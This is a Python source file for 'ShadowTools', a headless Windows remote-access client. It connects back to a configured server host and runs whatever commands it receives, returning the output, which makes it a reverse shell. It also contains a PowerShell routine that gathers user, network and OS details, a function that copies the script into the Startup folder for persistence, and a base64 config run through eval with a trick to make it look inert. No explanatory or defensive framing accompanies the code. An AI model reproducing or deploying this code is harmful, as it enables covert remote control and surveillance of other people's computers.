#!python3
# -*- coding: utf-8 -*-
########################################
# Client.pyw
#	New Client Draft Python
#	uses .pyw to run headless
########################################
#
SoftName="ShadowTools-Client"
ENCODED_CONFIG='null=='#/ENCODEDCONF
#
########################################
#		TO DO / IDEAS: 
# 
# 
########################################
# IMPORTS
########################################
#
# pickle for saving/loading local config files
import pickle
# socket for connecting to the server
import socket
# os for system calls
import os
# subprocess for getting the results of commands executed
import subprocess
# time for sleeping/waiting
from time import sleep as wait
# base64 for encoding/decoding of the config
from base64 import b64decode
# /imports





# LOAD CONFIG
def LoadConfig():
	#
	# PARSE CONFIG
	def ParseConfig(ENCODED_CONFIG):
		# this takes in the base64 string and first base64 decodes it into a bytes object?
		CONFIG=b64decode(ENCODED_CONFIG)
		# that object is further decode()'d into a string, then eval()'d into a dict
		try:
			CONFIG=eval(CONFIG.decode())
		except:
			return "broken"
		# this print line could be commented out, or put behind a DEBUG if()
		print(CONFIG)
		# lastly we yield the CONFIG dict that was decoded from the embedded config
		return CONFIG
	# /ParseConfig
	#
	# LoadConfig will first try to load the ENCODED_CONFIG if there is one present
	# if the encoded config is not the default/empty "null" then try to parse it
	# using the above defined function. this could be behind a try:/except: for error handling
	# in case the config is corrupt and unloadable as a dict
	#	as long as the CONFIG embed *starts* with 'null' it will appear empty.
	#	so you could have one line a='null >>realbase64stringhere' and it would be inert
	CONFIG='null'
	if(ENCODED_CONFIG[0:4]!="null"):
		try:
			CONFIG=ParseConfig(ENCODED_CONFIG)
			if(CONFIG=="broken"):
				raise
		except:
			CONFIG="null"
	if(CONFIG=="null"):
		# if that did not work, then we try to open a .shadow config file (pickle)
		shadowpath='./Client.shadow'
		try:
			# Load config file, if there is one
			with open(shadowpath, 'rb') as file:
				CONFIG = pickle.load(file)
				print("Configuration loaded!")
		except:
			# finally we Load defaults, if no config file exists
			CONFIG	=	{
			"SERVER_HOST"	:	'FF.FF.FF.FF', 		#host ip
			"SERVER_PORT"	:	1189,				# 
			"BUFFER_SIZE"	:	1024 * 128,			# 128KB max size of messages, feel free to increase
			"SEPARATOR"		:	"<sep>",			# separator string for sending 2 messages in one go
			"mode"			:	"auto",				# 
					}
		# yeild the configuration as the product of this function
	return CONFIG
# /LoadCOnfig



# POWERSHELL INFORMER
def Informer():
	# this function can be called if the client is sent the "/informer" command
	#os.system("@ECHO OFF")
	os.system("cd %TEMP%")
	os.system("powershell.exe echo 'Informer Is Starting'")
	os.system("powershell -command mkdir C:\\$env:HOMEPATH\\Desktop\\Shadow-Tool\\INFORMER")
	os.system("powershell -command echo 'Computer And User Name:' > C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command whoami >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command echo 'IP-Address:' >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command ipconfig >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command echo 'ARP:' >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command arp -a >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command echo 'OS Name:' >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command (get-wmiobject win32_operatingsystem).name >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command echo 'CS OS Name:' >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command (get-wmiobject win32_operatingsystem).csname >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command echo 'OS Architecture:' >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command (get-wmiobject win32_operatingsystem).osarchitecture >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command echo 'Thank You For Using Informer' >> C:\\%HOMEPATH%\\Desktop\\Shadow-Tool\\INFORMER\\Informer.txt")
	os.system("powershell -command echo 'Informer Has Finished'")
	#os.system("powershell -command sleep 3")
	#os.system("powershell -command exit")
# /Informer


# MOVE SCRIPT TO STARTUP FOLDER AND RELAUNCH
def MoveClient(where='startupdir'):
	# this function can be called if the client is sent the "/moveclient" command
	# the where=startupdir currently does nothing, but you could use this to accept multiple
	# arguments and parse it into where you want the script to move itself to, besides /startup/
	os.system("@ECHO OFF")
	os.system("cd %TEMP%")
	os.system("powershell -command copy-item C:\$env:HOMEPATH\Desktop\Shadow-Tool\Client.py -destination C:\$env:HOMEPATH\AppData\Roaming\Microsoft\Windows\\'Start Menu'\Programs\Startup")
	#os.system("powershell -command sleep 2")
	#os.system("powershell -command exit")
# /Informer




# CONNECT TO SERVER
def connect_to_server(CONFIG):
	# by the time this code is executed, the script is running, but not yet connected to anything
	running=True
	connected=False
	# under manual mode, it will stop and ask for confirmation.
	# this is useful to test config but send no packets
	if(CONFIG["mode"]=="manual"):
		confirmation=input("connect to "+str(CONFIG["SERVER_HOST"])+":"+str(CONFIG["SERVER_PORT"])+"? \n >> ")
		if(confirmation=="y" or confirmation=="yes"):
			pass
		else:
			running=False
			return
	else:
		# in the event of automatic mode, it will just print the connection details,
		# without waiting for any input. this wont be seen though if ran "headless" as .pyw
		print("connecting to "+str(CONFIG["SERVER_HOST"])+":"+str(CONFIG["SERVER_PORT"]))
	while(running):
		# now that the client is running, we can start networking
		# create the socket object
		s = socket.socket()
		try:
			# connect to the server
			s.connect((CONFIG["SERVER_HOST"], CONFIG["SERVER_PORT"]))
			# get the current directory
			cwd = os.getcwd()
			s.send(cwd.encode())
			print("connected!")
			connected=True
		except:
			print("server may be down.. trying again in 3 seconds")
			wait(3)
		while(connected):
			try:
				# receive the command from the server
				command = s.recv(CONFIG["BUFFER_SIZE"]).decode()
				splited_command = command.split()
				if(command.lower() == "informer"):
					Informer()
				elif(command.lower() == "moveclient"):
					MoveClient()
				elif(command.lower() == "exit"):
					# if the command is exit, just break out of the loop
					connected=False
					running=False
				elif(splited_command[0].lower() == "cd"):
					# cd command, change directory
					try:
						os.chdir(' '.join(splited_command[1:]))
					except FileNotFoundError as e:
						# if there is an error, set as the output
						output = str(e)
					else:
						# if operation is successful, empty message
						output = ""
				else:
					# execute the command and retrieve the results
					output = subprocess.getoutput(command)
				# get the current working directory as output
				cwd = os.getcwd()
				# send the results back to the server
				message = f"{output}{CONFIG['SEPARATOR']}{cwd}"
				s.send(message.encode())
			except KeyboardInterrupt:
				print("Program interrupted.")
				running=False
				connected=False
				break
			except:
				print("Connection Expired")
				connected=False
				s.close()
				break
			# /while(connected)
		# /while(running)
		#	repeat loop if the connection was broken, create a new connection
	# close client connection
	s.close()
	return



# IF this script is launched as primary, then code executes,
#	keeping any execution of code in a block like this,
#	makes the script able to be read by another script as an import,
# 	so we can combine assets from multiple scripts
if __name__ == '__main__':
	#
	# LoadConfig renders the CONFIG for us to use
	CONFIG=LoadConfig()
	# Launch this script with our CONFIG
	connect_to_server(CONFIG)
#
# 
##################################################
#             S H A D O W    T O O L             #
##################################################
# End Of File: Client.pyw